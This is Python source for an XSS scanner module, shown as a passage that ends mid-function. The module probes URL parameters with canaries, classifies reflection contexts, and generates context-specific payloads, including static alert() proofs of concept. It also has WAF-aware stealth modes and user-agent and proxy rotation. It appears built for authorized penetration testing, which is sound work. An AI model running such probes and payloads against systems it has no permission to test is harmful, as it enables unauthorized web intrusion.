"""Active parameter reflection prober for XSS surface mapping.

For each URL query parameter, sends two requests:
  1. Reflection probe  — a canary string to map where input appears in the response.
  2. Character probe   — canary + XSS-relevant chars to learn which survive filters.

Results are returned as ProbeResult objects that enrich the ParsedContext passed
to the AI generator, so payloads are targeted to confirmed contexts.
"""
from __future__ import annotations

import logging
import json
import os
import re
import secrets
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from itertools import cycle
from pathlib import Path
from typing import Any, Callable
from urllib.parse import quote as url_quote
import urllib.parse

log = logging.getLogger(__name__)

from scrapling.fetchers import FetcherSession

from ai_xss_generator.browser_nav import goto_with_edge_recovery
from ai_xss_generator.types import DomSink, ParsedContext, PayloadCandidate

# curl error code for HTTP/2 stream reset — server/WAF rejected the connection
_CURL_HTTP2_STREAM_ERROR = 92

# WAFs that require a real browser for TLS fingerprinting / JS challenge
_BROWSER_REQUIRED_WAFS: frozenset[str] = frozenset({
    "akamai", "cloudflare", "datadome", "kasada", "perimeterx",
})

# Known tracking/analytics params that are never reflected in meaningful page
# content. Probing these wastes requests and produces false negatives.
_TRACKING_PARAM_BLOCKLIST: frozenset[str] = frozenset({
    # Google Analytics / UTM
    "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content",
    "utm_id", "utm_keyword", "utm_source_platform", "utm_creative_format", "utm_marketing_tactic",
    # Google Ads click IDs
    "gclid", "gclsrc", "dclid",
    # Meta / Facebook
    "fbclid", "fb_action_ids", "fb_action_types", "fb_source", "fb_ref",
    # Microsoft / Bing
    "msclkid",
    # TikTok
    "ttclid",
    # Twitter / X
    "twclid",
    # LinkedIn
    "li_fat_id",
    # Pinterest
    "epik",
    # Snapchat
    "sccid",
    # Rakuten / LinkShare affiliate
    "ranmid", "raneaid", "ransiteid",
    # CJ Affiliate
    "cjevent",
    # Impact / Radius
    "irclickid",
    # ShareASale
    "sscid",
    # Generic affiliate click IDs
    "clickid", "click_id", "affiliate_id",
    # Mailchimp
    "mc_eid", "mc_cid",
    # Klaviyo
    "_kx",
    # Marketo
    "mkt_tok",
    # Drip
    "__s",
    # Google Analytics cross-domain linker
    "_ga", "_gl",
    # HubSpot
    "hsctatracking",
})


# XSS-critical characters to test for survival after server processing
PROBE_CHARS = '<>"\';\\/`(){}'

# Sentinel strings that bracket the probe chars in the request value
_PROBE_OPEN = "AXSSOP"
_PROBE_CLOSE = "AXSSCL"

# Max concurrently-active probe threads per URL
_PROBE_MAX_WORKERS = 6

# Max crawled pages to sweep for session-stored XSS (caps follow-up sweep cost)
_FOLLOW_UP_CRAWLED_LIMIT = 30
_BROWSER_PROBE_TIMEOUT_MS = 25_000
_BROWSER_PROBE_SETTLE_SECONDS = 0.35


class _RateLimiter:
    """Thread-safe token-bucket rate limiter.

    Smooths burst requests across threads so the global request rate never
    exceeds *rate* req/s even when multiple probe threads are active.
    """

    def __init__(self, rate: float) -> None:
        self._rate = rate
        # Bucket capacity is at least 1.0 so acquire() can always grant a token.
        # For rate < 1.0 (very slow scans), capping at self._rate would prevent
        # tokens from ever reaching the 1.0 threshold.
        self._bucket_cap: float = max(rate, 1.0)
        self._lock = threading.Lock()
        self._tokens: float = 1.0  # start with exactly one token: first request fires immediately
        self._last: float = time.monotonic()

    def acquire(self) -> None:
        """Block until one token is available, then consume it."""
        if self._rate <= 0:
            return
        while True:
            with self._lock:
                now = time.monotonic()
                elapsed = now - self._last
                self._last = now
                self._tokens = min(self._bucket_cap, self._tokens + elapsed * self._rate)
                if self._tokens >= 1.0:
                    self._tokens -= 1.0
                    return
                wait = (1.0 - self._tokens) / self._rate
            time.sleep(wait)


# ---------------------------------------------------------------------------
# Data types
# ---------------------------------------------------------------------------


# Tags whose content is never executable — reflections inside these are inert.
# XSStrike calls these "bad tags"; we skip them rather than generating payloads.
_INERT_TAGS: tuple[str, ...] = (
    "style", "template", "textarea", "title", "noembed", "noscript",
)


@dataclass(slots=True)
class ReflectionContext:
    """A single location where a probed parameter was reflected."""

    context_type: str
    """One of: js_string_dq | js_string_sq | js_string_bt | js_code |
    html_attr_event | html_attr_url | html_attr_value |
    html_body | html_comment | json_value"""

    attr_name: str = ""
    """Attribute name for html_attr_* contexts (e.g. 'href', 'onclick')."""

    tag_name: str = ""
    """HTML tag name for reflected markup contexts when it can be inferred."""

    quote_style: str = ""
    """Quote style for reflected attr/json contexts: single | double | unquoted."""

    html_subcontext: str = ""
    """Narrower reflected HTML placement hint for prompt routing."""

    attacker_prefix: str = ""
    """Short local content prefix immediately before the reflected value."""

    attacker_suffix: str = ""
    """Short local content suffix immediately after the reflected value."""

    payload_shape: str = ""
    """Best-fit exploit shape such as quote_closure or same_tag_attr_pivot."""

    subcontext_explanation: str = ""
    """Short human-readable explanation of the reflected placement."""

    evidence_confidence: float = 0.0
    """Confidence that the inferred reflected subcontext is correct."""

    surviving_chars: frozenset[str] = field(default_factory=frozenset)
    """Probe chars that came back literally unmodified in the response."""

    snippet: str = ""
    """Short excerpt of surrounding HTML for reference."""

    context_before: str = ""
    """For js_string_* and js_code contexts: the script block content that
    appears before the injection point.  Fed to js_contexter to build the
    dynamic break-out closer string.  Empty for all other context types."""

    @property
    def is_exploitable(self) -> bool:
        """True if surviving chars indicate at least one XSS technique can work."""
        ct = self.context_type
        sc = self.surviving_chars
        if ct == "js_string_dq":
            return '"' in sc or ";" in sc
        if ct == "js_string_sq":
            return "'" in sc or ";" in sc
        if ct == "js_string_bt":
            return "`" in sc or ";" in sc
        if ct == "js_code":
            return bool(sc)
        if ct == "html_attr_event":
            return True  # already in JS — no breakout needed
        if ct == "html_attr_url":
            return True  # javascript: URI still works regardless of other chars
        if ct == "html_attr_value":
            return '"' in sc or "'" in sc
        if ct == "html_body":
            return "<" in sc
        if ct == "html_comment":
            return "-" in sc or "<" in sc
        if ct == "json_value":
            return '"' in sc
        if ct == "fast_omni":
            return True  # synthetic omni context — always exploitable
        return bool(sc)

    @property
    def short_label(self) -> str:
        return self.context_type + (f"({self.attr_name})" if self.attr_name else "")


def _truncate_context_fragment(value: str, *, limit: int = 120, tail: bool = True) -> str:
    if len(value) <= limit:
        return value
    if tail:
        return value[-limit:]
    return value[:limit]


def _clone_reflection_context(ctx: ReflectionContext, *, surviving_chars: frozenset[str]) -> ReflectionContext:
    return ReflectionContext(
        context_type=ctx.context_type,
        attr_name=ctx.attr_name,
        tag_name=ctx.tag_name,
        quote_style=ctx.quote_style,
        html_subcontext=ctx.html_subcontext,
        attacker_prefix=ctx.attacker_prefix,
        attacker_suffix=ctx.attacker_suffix,
        payload_shape=ctx.payload_shape,
        subcontext_explanation=ctx.subcontext_explanation,
        evidence_confidence=ctx.evidence_confidence,
        surviving_chars=surviving_chars,
        snippet=ctx.snippet,
        context_before=ctx.context_before,
    )


@dataclass(slots=True)
class ProbeResult:
    """Probe results for a single URL parameter."""

    param_name: str
    original_value: str
    reflections: list[ReflectionContext] = field(default_factory=list)
    error: str | None = None
    reflection_transform: str = ""
    discovery_style: str = ""
    probe_mode: str = ""
    tested_chars: str = PROBE_CHARS

    @property
    def is_reflected(self) -> bool:
        return bool(self.reflections)

    @property
    def is_injectable(self) -> bool:
        return any(ctx.is_exploitable for ctx in self.reflections)

    def to_sinks(self) -> list[DomSink]:
        """Convert probe results to DomSink entries for context enrichment."""
        sinks = []
        for ctx in self.reflections:
            sink_name = f"probe:{ctx.context_type}"
            if ctx.attr_name:
                sink_name += f":{ctx.attr_name}"
            chars_note = (
                f" surviving={sorted(ctx.surviving_chars)!r}" if ctx.surviving_chars else ""
            )
            sinks.append(
                DomSink(
                    sink=sink_name,
                    source=(
                        f"param={self.param_name!r} confirmed via active probe"
                        f" → {ctx.short_label}{chars_note}"
                    ),
                    location=f"active_probe:param:{self.param_name}",
                    confidence=0.99 if ctx.is_exploitable else 0.88,
                )
            )
        return sinks


# ---------------------------------------------------------------------------
# Context classification
# ---------------------------------------------------------------------------


def _make_canary() -> str:
    return "axss" + secrets.token_hex(4)


@dataclass(slots=True)
class _ProbeSeed:
    reflection_value: str
    char_probe_value: str
    style: str


@dataclass(slots=True)
class _ProbePlan:
    mode: str
    chars: str
    follow_up_limit: int


def _probe_seed_for_param(param_name: str, canary: str, original_value: str = "") -> _ProbeSeed:
    """Return a low-noise reflection seed for semantically constrained params."""
    name = param_name.lower()
    original = (original_value or "").strip().lower()
    markers = _PROBE_OPEN + PROBE_CHARS + _PROBE_CLOSE

    def _wrap(prefix: str = "", suffix: str = "", style: str = "plain") -> _ProbeSeed:
        return _ProbeSeed(
            reflection_value=prefix + canary + suffix,
            char_probe_value=prefix + canary + markers + suffix,
            style=style,
        )

    urlish_names = {
        "url", "uri", "redirect", "return", "returnto", "next", "continue",
        "dest", "destination", "target", "href", "src", "link",
    }
    search_names = {
        "q", "query", "search", "text", "articleq", "keyword", "keywords",
        "term", "name",
    }
    location_names = {
        "location", "city", "state", "country", "zip", "zipcode", "postcode",
        "post_code", "address", "region",
    }
    email_names = {"email", "mail", "username", "user"}

    if name in urlish_names or original.startswith(("http://", "https://", "/")):
        return _wrap(prefix="https://axss.invalid/", style="url_like")
    if name in email_names or "@" in original:
        return _wrap(suffix="@example.test", style="email_like")
    if name in location_names:
        return _wrap(prefix="san-francisco-", style="location_like")
    if name in search_names:
        return _wrap(prefix="search-", style="search_text")
    return _wrap(style="plain")


def _adaptive_probe_plan(
    *,
    url: str,
    waf: str | None,
    auth_headers: dict[str, str] | None,
    param_name: str,
    param_count: int,
) -> _ProbePlan:
    """Choose a bounded discovery mode based on observed target sensitivity."""
    lower_url = url.lower()
    lower_param = param_name.lower()
    lower_waf = (waf or "").lower()
    sensitive_path = any(
        marker in lower_url
        for marker in ("/login", "/signin", "/auth", "/register", "/account", "/checkout")
    )
    sensitive_param = lower_param in {
        "redirect", "return", "returnto", "next", "continue",
        "location", "email", "username", "token",
    }
    strong_edge = lower_waf in _BROWSER_REQUIRED_WAFS
    auth_required = bool(auth_headers)

    if strong_edge or auth_required or sensitive_path:
        chars = '<>"\'()/'
        if sensitive_param:
            chars = '"\'()'
        return _ProbePlan(
            mode="stealth",
            chars=chars,
            follow_up_limit=8 if param_count > 3 else 12,
        )

    if param_count >= 8:
        return _ProbePlan(mode="budgeted", chars='<>"/\'()', follow_up_limit=12)

    return _ProbePlan(mode="standard", chars=PROBE_CHARS, follow_up_limit=_FOLLOW_UP_CRAWLED_LIMIT)


def _canary_variants(canary: str) -> list[str]:
    variants = [canary]
    for variant in (canary.upper(), canary.lower()):
        if variant not in variants:
            variants.append(variant)
    return variants


def _inside_inert_tag(before: str) -> bool:
    """Return True if *before* ends inside a non-executable tag's content.

    Tags like <textarea>, <style>, <title>, <noscript> render content as
    text — injected HTML/JS inside them cannot execute.  We detect them the
    same way we detect <script>: find the last unclosed opener.
    """
    for tag in _INERT_TAGS:
        open_pos = before.rfind(f"<{tag}")
        if open_pos == -1:
            continue
        # Confirm it's actually <tagname (not e.g. <textarea-custom>)
        after_name = before[open_pos + 1 + len(tag) : open_pos + 2 + len(tag)]
        if after_name and after_name not in (" ", ">", "/", "\t", "\n", "\r"):
            continue
        close_pos = before.rfind(f"</{tag}")
        if close_pos == -1 or close_pos < open_pos:
            return True
    return False


def _infer_tag_name(tag_content: str) -> str:
    match = re.match(r"<\s*([A-Za-z][\w:-]*)", tag_content)
    return match.group(1).lower() if match else ""


def _build_reflected_explanation(
    *,
    context_type: str,
    tag_name: str = "",
    attr_name: str = "",
    quote_style: str = "",
) -> str:
    if context_type == "html_attr_url":
        style = f"{quote_style}-quoted " if quote_style in ("single", "double") else (
            "unquoted " if quote_style == "unquoted" else ""
        )
        location = f"{style}{attr_name} attribute"
        if tag_name:
            location += f" on <{tag_name}>"
        return f"Reflection is inside a {location}."
    if context_type == "html_attr_event":
        style = f"{quote_style}-quoted " if quote_style in ("single", "double") else (
            "unquoted " if quote_style == "unquoted" else ""
        )
        location = f"{style}{attr_name} event handler"
        if tag_name:
            location += f" on <{tag_name}>"
        return f"Reflection is inside a {location}."
    if context_type == "html_attr_value":
        style = f"{quote_style}-quoted " if quote_style in ("single", "double") else (
            "unquoted " if quote_style == "unquoted" else ""
        )
        location = f"{style}{attr_name} attribute"
        if tag_name:
            location += f" on <{tag_name}>"
        return f"Reflection is inside a {location}."
    if context_type == "html_comment":
        return "Reflection is inside an open HTML comment."
    if context_type == "json_value":
        style = f"{quote_style}-quoted " if quote_style else ""
        return f"Reflection appears inside a {style}JSON string value.".strip()
    return "Reflection appears in raw HTML body text."


def _build_payload_shape(context_type: str, attr_name: str, quote_style: str) -> str:
    if context_type == "html_attr_url":
        if attr_name == "srcdoc":
            return "same_tag_attr_pivot_or_srcdoc"
        if quote_style in ("single", "double"):
            return "scheme_or_quote_closure"
        return "scheme_or_same_tag_attr_pivot"
    if context_type == "html_attr_event":
        return "event_handler_in_place"
    if context_type == "html_attr_value":
        if quote_style in ("single", "double"):
            return "quote_closure_or_same_tag_attr_pivot"
        return "same_tag_attr_pivot"
    if context_type == "html_comment":
        return "comment_breakout"
    if context_type == "json_value":
        return "json_string_breakout"
    return "raw_tag_injection"


def _build_html_subcontext(context_type: str, attr_name: str, quote_style: str) -> str:
    if context_type == "html_attr_url":
        prefix = {
            "single": "single_quoted",
            "double": "double_quoted",
            "unquoted": "unquoted",
        }.get(quote_style, "unknown")
        suffix = "srcdoc_attr" if attr_name == "srcdoc" else "url_attr"
        return f"{prefix}_{suffix}"
    if context_type == "html_attr_event":
        prefix = {
            "single": "single_quoted",
            "double": "double_quoted",
            "unquoted": "unquoted",
        }.get(quote_style, "unknown")
        return f"{prefix}_event_attr"
    if context_type == "html_attr_value":
        prefix = {
            "single": "single_quoted",
            "double": "double_quoted",
            "unquoted": "unquoted",
        }.get(quote_style, "unknown")
        return f"{prefix}_attr_value"
    if context_type == "html_comment":
        return "html_comment"
    if context_type == "json_value":
        prefix = {
            "single": "single_quoted",
            "double": "double_quoted",
        }.get(quote_style, "quoted")
        return f"{prefix}_json_value"
    return "raw_html_body"


def _classify_context_at(html: str, idx: int, canary: str) -> ReflectionContext | None:
    """Determine the XSS injection context at *idx* in *html*.

    Returns None when the reflection is inside a non-executable tag
    (textarea, style, title, noscript, noembed) — no payload can execute there.
    """
    snippet_start = max(0, idx - 300)
    snippet_end = min(len(html), idx + len(canary) + 100)
    snippet = html[snippet_start:snippet_end]
    before = html[:idx]

    # 0. Inert tag check — must come first so we don't misclassify these as
    #    html_body.  A reflection inside <textarea> is not exploitable.
    if _inside_inert_tag(before):
        return None

    # 1. HTML comment?
    copen = before.rfind("<!--")
    cclose = before.rfind("-->")
    if copen != -1 and (cclose == -1 or cclose < copen):
        comment_start = max(copen, idx - 80)
        comment_end = min(len(html), idx + len(canary) + 80)
        return ReflectionContext(
            context_type="html_comment",
            html_subcontext="html_comment",
            attacker_prefix=_truncate_context_fragment(html[comment_start:idx]),
            attacker_suffix=_truncate_context_fragment(html[idx + len(canary):comment_end], tail=False),
            payload_shape="comment_breakout",
            subcontext_explanation=_build_reflected_explanation(context_type="html_comment"),
            evidence_confidence=0.9,
            snippet=snippet,
        )

    # 2. Inside a <script> block?
    script_open_pos = before.rfind("<script")
    script_close_pos = before.rfind("</script")
    in_script = script_open_pos != -1 and (
        script_close_pos == -1 or script_close_pos < script_open_pos
    )
    if in_script:
        tag_end = html.find(">", script_open_pos)
        content_before = html[tag_end + 1 : idx] if tag_end != -1 else before
        for quote_char, ctx_type in [
            ('"', "js_string_dq"),
            ("'", "js_string_sq"),
            ("`", "js_string_bt"),
        ]:
            count = 0
            i = 0
            while i < len(content_before):
                ch = content_before[i]
                if ch == "\\" and i + 1 < len(content_before):
                    i += 2
                    continue
                if ch == quote_char:
                    count += 1
                i += 1
            if count % 2 == 1:
                return ReflectionContext(
                    context_type=ctx_type,
                    snippet=snippet,
                    context_before=content_before,
                )
        return ReflectionContext(
            context_type="js_code",
            snippet=snippet,
            context_before=content_before,
        )

    # 3. Inside an HTML attribute?
    last_tag_open = before.rfind("<")
    last_tag_close = before.rfind(">")
    if last_tag_open != -1 and last_tag_open > last_tag_close:
        tag_content = before[last_tag_open:]
        tag_name = _infer_tag_name(tag_content)
        attr_m = re.search(r"""([\w:-]+)\s*=\s*(?:(['"])([^'"]*)|([^\s"'<>`=]*))$""", tag_content)
        if attr_m:
            attr_name = attr_m.group(1).lower()
            quote_char = attr_m.group(2) or ""
            quote_style = {"'": "single", '"': "double"}.get(quote_char, "unquoted")
            tag_end = html.find(">", idx)
            attacker_prefix = _truncate_context_fragment(tag_content)
            attacker_suffix = ""
            if tag_end != -1:
                attacker_suffix = _truncate_context_fragment(
                    html[idx + len(canary): tag_end + 1],
                    tail=False,
                )
            if attr_name.startswith("on"):
                return ReflectionContext(
                    context_type="html_attr_event",
                    attr_name=attr_name,
                    tag_name=tag_name,
                    quote_style=quote_style,
                    html_subcontext=_build_html_subcontext("html_attr_event", attr_name, quote_style),
                    attacker_prefix=attacker_prefix,
                    attacker_suffix=attacker_suffix,
                    payload_shape=_build_payload_shape("html_attr_event", attr_name, quote_style),
                    subcontext_explanation=_build_reflected_explanation(
                        context_type="html_attr_event",
                        tag_name=tag_name,
                        attr_name=attr_name,
                        quote_style=quote_style,
                    ),
                    evidence_confidence=0.96,
                    snippet=snippet,
                )
            if attr_name in (
                "href", "src", "action", "formaction", "data",
                "xlink:href", "content", "srcdoc",
            ):
                return ReflectionContext(
                    context_type="html_attr_url",
                    attr_name=attr_name,
                    tag_name=tag_name,
                    quote_style=quote_style,
                    html_subcontext=_build_html_subcontext("html_attr_url", attr_name, quote_style),
                    attacker_prefix=attacker_prefix,
                    attacker_suffix=attacker_suffix,
                    payload_shape=_build_payload_shape("html_attr_url", attr_name, quote_style),
                    subcontext_explanation=_build_reflected_explanation(
                        context_type="html_attr_url",
                        tag_name=tag_name,
                        attr_name=attr_name,
                        quote_style=quote_style,
                    ),
                    evidence_confidence=0.96,
                    snippet=snippet,
                )
            return ReflectionContext(
                context_type="html_attr_value",
                attr_name=attr_name,
                tag_name=tag_name,
                quote_style=quote_style,
                html_subcontext=_build_html_subcontext("html_attr_value", attr_name, quote_style),
                attacker_prefix=attacker_prefix,
                attacker_suffix=attacker_suffix,
                payload_shape=_build_payload_shape("html_attr_value", attr_name, quote_style),
                subcontext_explanation=_build_reflected_explanation(
                    context_type="html_attr_value",
                    tag_name=tag_name,
                    attr_name=attr_name,
                    quote_style=quote_style,
                ),
                evidence_confidence=0.94,
                snippet=snippet,
            )

    # 4. JSON value heuristic
    stripped_before = before.rstrip()
    if stripped_before.endswith(('": "', "': '", '":"', "':'")):
        quote_style = "double" if stripped_before.endswith(('": "', '":"')) else "single"
        return ReflectionContext(
            context_type="json_value",
            quote_style=quote_style,
            html_subcontext=_build_html_subcontext("json_value", "", quote_style),
            attacker_prefix=_truncate_context_fragment(before),
            attacker_suffix=_truncate_context_fragment(
                html[idx + len(canary): min(len(html), idx + len(canary) + 100)],
                tail=False,
            ),
            payload_shape=_build_payload_shape("json_value", "", quote_style),
            subcontext_explanation=_build_reflected_explanation(
                context_type="json_value",
                quote_style=quote_style,
            ),
            evidence_confidence=0.88,
            snippet=snippet,
        )

    # 5. Raw HTML body (fallback)
    body_start = max(last_tag_close + 1, idx - 80)
    next_tag_open = html.find("<", idx + len(canary))
    if next_tag_open == -1:
        next_tag_open = min(len(html), idx + len(canary) + 80)
    return ReflectionContext(
        context_type="html_body",
        html_subcontext="raw_html_body",
        attacker_prefix=_truncate_context_fragment(html[body_start:idx]),
        attacker_suffix=_truncate_context_fragment(
            html[idx + len(canary):next_tag_open],
            tail=False,
        ),
        payload_shape="raw_tag_injection",
        subcontext_explanation=_build_reflected_explanation(context_type="html_body"),
        evidence_confidence=0.82,
        snippet=snippet,
    )


def _find_reflections(html: str, canary: str) -> list[ReflectionContext]:
    """Find all positions of *canary* in *html* and classify each injection context."""
    indexed_contexts: list[tuple[int, ReflectionContext]] = []
    seen_contexts: set[str] = set()
    seen_positions: set[int] = set()
    for variant in _canary_variants(canary):
        pos = 0
        while True:
            idx = html.find(variant, pos)
            if idx == -1:
                break
            pos = idx + 1
            if idx in seen_positions:
                continue
            seen_positions.add(idx)
            ctx = _classify_context_at(html, idx, variant)
            if ctx and ctx.context_type not in seen_contexts:
                indexed_contexts.append((idx, ctx))
                seen_contexts.add(ctx.context_type)
    indexed_contexts.sort(key=lambda item: item[0])
    return [ctx for _, ctx in indexed_contexts]


def _reflection_transform(html: str, canary: str) -> str:
    variants = _canary_variants(canary)
    if html.find(variants[0]) != -1:
        return "exact"
    for variant in variants[1:]:
        if html.find(variant) != -1:
            if variant == canary.upper():
                return "upper"
            if variant == canary.lower():
                return "lower"
            return "variant"
    return ""


def _analyze_char_survival(html: str, canary: str) -> frozenset[str]:
    """Return the set of probe chars that appeared unmodified in the response."""
    open_marker = ""
    pos = -1
    for variant in _canary_variants(canary):
        open_marker = variant + _PROBE_OPEN
        pos = html.find(open_marker)
        if pos != -1:
            break
    if pos == -1:
        return frozenset()
    start = pos + len(open_marker)
    end_pos = html.find(_PROBE_CLOSE, start)
    section = html[start:end_pos] if end_pos != -1 else html[start : start + len(PROBE_CHARS) + 30]
    return frozenset(ch for ch in PROBE_CHARS if ch in section)


# ---------------------------------------------------------------------------
# Payload generation for confirmed probe results
# ---------------------------------------------------------------------------


def payloads_for_probe_result(result: ProbeResult) -> list[PayloadCandidate]:
    """Generate targeted payloads for a confirmed probe reflection.

    Delegates to the combinatorial generator in ``active/generator.py`` for
    all context types so payloads are synthesised from the actual surviving
    character set and (for JS contexts) the dynamic break-out closer built
    by jsContexter.

    Falls back to a small set of static payloads for json_value and any
    context types not yet handled by the generator.
    """
    from ai_xss_generator.active import generator as gen

    payloads: list[PayloadCandidate] = []

    for ctx in result.reflections:
        sc = ctx.surviving_chars
        ct = ctx.context_type
        pn = result.param_name

        if ct == "html_body":
            payloads += gen.html_body_payloads(sc, pn)

        elif ct == "html_comment":
            payloads += gen.html_comment_payloads(sc, pn)

        elif ct == "js_string_dq" and ('"' in sc or ";" in sc):
            payloads += gen.js_string_payloads(sc, pn, '"', ctx.context_before, ct)

        elif ct == "js_string_sq" and ("'" in sc or ";" in sc):
            payloads += gen.js_string_payloads(sc, pn, "'", ctx.context_before, ct)

        elif ct == "js_string_bt" and ("`" in sc or ";" in sc):
            payloads += gen.js_string_payloads(sc, pn, "`", ctx.context_before, ct)

        elif ct == "js_code":
            payloads += gen.js_code_payloads(sc, pn, ctx.context_before)

        elif ct == "html_attr_event":
            payloads += gen.html_attr_event_payloads(sc, pn, ctx.attr_name)

        elif ct == "html_attr_url":
            payloads += gen.html_attr_url_payloads(sc, pn, ctx.attr_name)

        elif ct == "html_attr_value":
            payloads += gen.html_attr_value_payloads(sc, pn, ctx.attr_name)

        elif ct == "json_value" and '"' in sc:
            # json_value is niche enough that static payloads are fine
            for raw, title, risk in [
                ('</script><script>alert(document.domain)</script>', "JSON → script injection", 89),
                ('","xss":"<img src=x onerror=alert(1)>', "JSON structure break → HTML", 86),
            ]:
                payloads.append(PayloadCandidate(
                    payload=raw,
                    title=f"{title} [{pn}]",
                    explanation=f"Active probe confirmed json_value for '{pn}'.",
                    test_vector=f"?{pn}={url_quote(raw, safe='')}",
                    tags=["probe-confirmed", ct, f"param:{pn}"],
                    target_sink=f"probe:{ct}",
                    risk_score=risk,
                ))

    return payloads


# ---------------------------------------------------------------------------
# Probe session
# ---------------------------------------------------------------------------


def _resp_html(resp: Any) -> str:
    """Extract HTML text from a Scrapling response. Falls back to raw body bytes."""
    text = resp.text
    if text:
        return text
    body = getattr(resp, "body", None)
    if body:
        return body.decode("utf-8", errors="replace") if isinstance(body, bytes) else str(body)
    return ""


def _load_rotation_values(raw_value: str | None) -> list[str]:
    if not raw_value:
        return []
    path = Path(raw_value)
    values = (
        path.read_text(encoding="utf-8").splitlines()
        if path.exists()
        else raw_value.split(",")
    )
    return [v.strip() for v in values if v.strip()]


def _rebuild_url(url: str, params: dict[str, str]) -> str:
    """Return *url* with query string replaced by *params*."""
    import urllib.parse

    parsed = urllib.parse.urlparse(url)
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(params))
    )


def _browser_context_auth(
    url: str,
    auth_headers: dict[str, str] | None,
    user_agent: str,
) -> tuple[dict[str, str], list[dict[str, Any]], str]:
    """Split auth headers into Playwright headers + cookies for *url*."""
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or ""
    secure = parsed.scheme == "https"

    extra_headers: dict[str, str] = {}
    cookie_header = ""
    for name, value in (auth_headers or {}).items():
        if name.lower() == "cookie":
            cookie_header = value
            continue
        extra_headers[name] = value

    cookies: list[dict[str, Any]] = []
    if cookie_header and host:
        for raw_cookie in cookie_header.split(";"):
            if "=" not in raw_cookie:
                continue
            cookie_name, cookie_value = raw_cookie.split("=", 1)
            cookie_name = cookie_name.strip()
            if not cookie_name:
                continue
            cookies.append({
                "name": cookie_name,
                "value": cookie_value.strip(),
                "domain": host,
                "path": "/",
                "secure": secure,
                "httpOnly": False,
            })

    return extra_headers, cookies, user_agent


def _page_fetch_html(page: Any, url: str, timeout_ms: int = _BROWSER_PROBE_TIMEOUT_MS) -> str:
    """Navigate a Playwright page and return rendered HTML."""
    ok, _phases, nav_error = goto_with_edge_recovery(
        page,
        url,
        timeout_ms=timeout_ms,
    )
    if ok:
        time.sleep(_BROWSER_PROBE_SETTLE_SECONDS)
    try:
        return page.content()
    except Exception:
        if nav_error is not None:
            raise nav_error
        raise


def fetch_html_with_browser(
    url: str,
    *,
    auth_headers: dict[str, str] | None = None,
    user_agent: str = "axss/0.1 (+authorized security testing; playwright)",
    proxy: str | None = None,
    timeout_ms: int = _BROWSER_PROBE_TIMEOUT_MS,
) -> str:
    """Fetch rendered HTML through a real Playwright browser context."""
    from playwright.sync_api import sync_playwright

    extra_headers, cookies, browser_user_agent = _browser_context_auth(
        url,
        auth_headers,
        user_agent,
    )
    launch_kwargs: dict[str, Any] = {
        "headless": True,
        "args": ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
    }
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}

    with sync_playwright() as pw:
        browser = pw.chromium.launch(**launch_kwargs)
        try:
            context = browser.new_context(
                ignore_https_errors=True,
                extra_http_headers={**extra_headers, "Accept": "text/html,application/xhtml+xml"},
                user_agent=browser_user_agent,
            )
            try:
                if cookies:
                    context.add_cookies(cookies)

                def _route_handler(route: Any) -> None:
                    if route.request.resource_type in {"image", "media", "font", "stylesheet"}:
                        route.abort()
                    else:
                        route.continue_()

                context.route("**/*", _route_handler)
                page = context.new_page()
                return _page_fetch_html(page, url, timeout_ms=timeout_ms)
            finally:
                context.close()
        finally:
            browser.close()


def _session_get(session: Any, url: str, req_kwargs: dict[str, Any]) -> Any:
    """FetcherSession.get with automatic HTTP/1.1 retry on HTTP/2 stream reset."""
    try:
        return session.get(url, **req_kwargs)
    except Exception as exc:
        if f"({_CURL_HTTP2_STREAM_ERROR})" in str(exc):
            try:
                from scrapling.engines.static import CurlHttpVersion
                return session.get(url, **req_kwargs, http_version=CurlHttpVersion.V1_1)
            except Exception:
                raise exc
        raise


def _probe_param(
    session: Any,
    url: str,
    param_name: str,
    original_value: str,
    all_params: dict[str, str],
    *,
    canary: str,
    delay: float,
    ua_cycle: Any,
    proxy_cycle: Any | None,
    waf: str | None = None,
    auth_headers: dict[str, str] | None = None,
    rate_limiter: "_RateLimiter | None" = None,
    sink_url: str | None = None,
    crawled_pages: list[str] | None = None,
) -> ProbeResult:
    """Send two probe requests for one parameter and return a ProbeResult."""
    probe_seed = _probe_seed_for_param(param_name, canary, original_value)
    probe_plan = _adaptive_probe_plan(
        url=url,
        waf=waf,
        auth_headers=auth_headers,
        param_name=param_name,
        param_count=len(all_params),
    )
    probe_marker = _PROBE_OPEN + probe_plan.chars + _PROBE_CLOSE
    # Auth headers first; User-Agent from rotation always wins
    merged_headers: dict[str, str] = {**(auth_headers or {}), "User-Agent": next(ua_cycle)}
    req_kwargs: dict[str, Any] = {"headers": merged_headers}
    if proxy_cycle:
        req_kwargs["proxy"] = next(proxy_cycle)

    def _wait() -> None:
        if rate_limiter is not None:
            rate_limiter.acquire()
        elif delay > 0:
            time.sleep(delay)

    # Phase 1 — reflection mapping
    _wait()
    try:
        resp1 = _session_get(
            session,
            _rebuild_url(url, {**all_params, param_name: probe_seed.reflection_value}),
            req_kwargs,
        )
    except Exception as exc:
        return ProbeResult(
            param_name=param_name,
            original_value=original_value,
            error=str(exc),
            discovery_style=probe_seed.style,
            probe_mode=probe_plan.mode,
            tested_chars=probe_plan.chars,
        )

    html1 = _resp_html(resp1)
    reflections = _find_reflections(html1, canary)
    reflection_transform = _reflection_transform(html1, canary)
    if not reflections:
        # --sink-url: check user-specified sink page for GET-based stored XSS.
        # Session cookies carry the injected canary across requests.
        if sink_url:
            try:
                _wait()
                _sink_resp = _session_get(session, sink_url, {"headers": {"User-Agent": next(ua_cycle)}})
                _sink_html = _resp_html(_sink_resp)
                _sink_refs = _find_reflections(_sink_html, canary)
                if _sink_refs:
                    _char_url = _rebuild_url(url, {**all_params, param_name: probe_seed.char_probe_value})
                    _wait()
                    _session_get(session, _char_url, {"headers": {"User-Agent": next(ua_cycle)}})
                    _wait()
                    _sink_resp2 = _session_get(session, sink_url, {"headers": {"User-Agent": next(ua_cycle)}})
                    _surviving = _analyze_char_survival(_resp_html(_sink_resp2), canary)
                    if _reflection_transform(_sink_html, canary) == "upper":
                        _surviving = _surviving.union(frozenset("ABCDEFGHIJKLMNOPQRSTUVWXYZ"))
                    log.debug(
                        "probe_url: canary found in sink_url %s for param %s",
                        sink_url, param_name,
                    )
                    return ProbeResult(
